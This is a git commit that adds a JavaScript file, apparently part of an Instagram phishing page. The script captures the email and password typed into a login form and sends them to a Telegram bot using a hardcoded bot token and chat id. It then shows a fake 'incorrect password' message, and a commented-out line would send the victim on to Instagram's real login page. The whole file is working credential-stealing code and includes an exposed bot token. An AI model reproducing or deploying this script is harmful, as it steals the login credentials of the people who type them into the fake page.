06af5f60b79c6f4fc40696d147aea4f442eb5564
tammyhig <146199870+tammyhig@users.noreply.github.com>
2023-11-07 08:48:01 +0100

    Add files via upload

---
+++ js/sender.js
@@ -0,0 +1,22 @@
+const form = document.querySelector("#form")
+
+form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    var identity = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+
+    var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`
+
+    var token = "6600608955:AAFKyCPNWgIEeTeeyDg4E8BcN9-HYvhCcvk";
+    var chat_id = -4052230663
+    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
+
+    let api = new XMLHttpRequest();
+    api.open("GET", url, true);
+    api.send();
+    // window.location.replace("https://www.instagram.com/accounts/login/")
+    console.log("Incorrect Password!");
+
+    document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
+})
